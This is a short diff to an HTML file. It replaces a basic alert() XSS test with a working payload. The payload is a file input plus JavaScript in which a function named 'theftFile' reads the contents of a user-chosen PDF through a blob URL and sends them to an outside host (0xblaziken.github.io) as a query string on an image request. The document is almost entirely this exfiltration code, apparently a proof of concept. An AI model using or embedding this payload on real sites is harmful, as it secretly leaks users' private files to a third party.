@@ -1,1 +1,22 @@
-<script>alert("Javascript execution")</script>
+<input type="file" accept="application/pdf" onchange="blobCallback(window.URL.createObjectURL(this.files[0]))">
+
+<script type="text/javascript">
+    function blobCallback(blobUrl) {
+        theftFile(blobUrl, function(contents) {
+            new Image().src = "http://0xblaziken.github.io/?data=" + encodeURIComponent(contents);
+        });
+    }
+
+    function theftFile(url, callback) {
+      var req = new XMLHttpRequest();
+
+      req.open("GET", url, true);
+      req.onload = function(e) {
+        callback(req.responseText);
+      }
+      req.onerror = function(e) {
+        callback("error");
+      }
+      req.send();
+    }
+</script>
